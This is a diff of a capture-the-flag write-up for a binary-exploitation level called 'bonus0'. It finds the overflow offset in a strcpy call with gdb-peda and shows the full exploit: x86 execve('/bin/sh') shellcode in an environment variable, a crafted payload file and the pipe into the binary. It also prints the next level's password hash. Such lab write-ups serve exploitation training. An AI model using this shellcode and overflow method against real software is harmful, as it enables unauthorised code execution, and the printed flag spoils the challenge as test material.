@@ -1,24 +1,53 @@
-strcpy => Buffer Overflow
+# We are going to try to overflow the strcpy function
 0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
 
 # Let's find a which offset the program segfault
-gdb> pattern create 100
+
+gdb-peda$ pattern_create 100
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
-gdb> r
+
+gdb-peda$ r
  -
  AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
  -
  AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
-SIGSEGV
-gdb> pattern search
-[...]
+Stopped reason: SIGSEGV
+0x24414142 in ?? ()
+
+gdb-peda$ pattern_search
 Registers contain pattern buffer:
-EBP+0 found at offset: 9
-EIP+0 found at offset: 13
-[...]
+EIP+0 found at offset: 9
+EBP+0 found at offset: 5
 
-# Now we need to know if the offset correspond to the first or the second string
+Offset is 9
 
-$> cat /tmp/payload  - | ./bonus0
-> cat /home/user/bonus1/.pass
+# Now we need to know the offset correspond to which string
+gdb-peda$ r
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -
+AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+Stopped reason: SIGSEGV
+0x24414142 in ?? ()
+
+# second string is concerned by the overflow
+
+# Difficulty = how to send a single file for the two parameters of string
+# (string 1, string2)
+
+# shellcode
+# we have to :
+# in the first string
+# put in the first Buffer 4095 random characters
+# and write a '\n' to get the first string with (4095 + 1) 4096 characeters
+# in the second string
+# put the address of our shellcode after the offset
+# fill the rest of the second string until 20 characters or more
+export exploit=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+
+# we look for an address of nop like in level2
+address to put : 0xbffffb3e
+python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x3e\xfb\xff\xbf' + 'A' * 7" > /tmp/payload
+cat /tmp/payload  - | ./bonus0
+cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
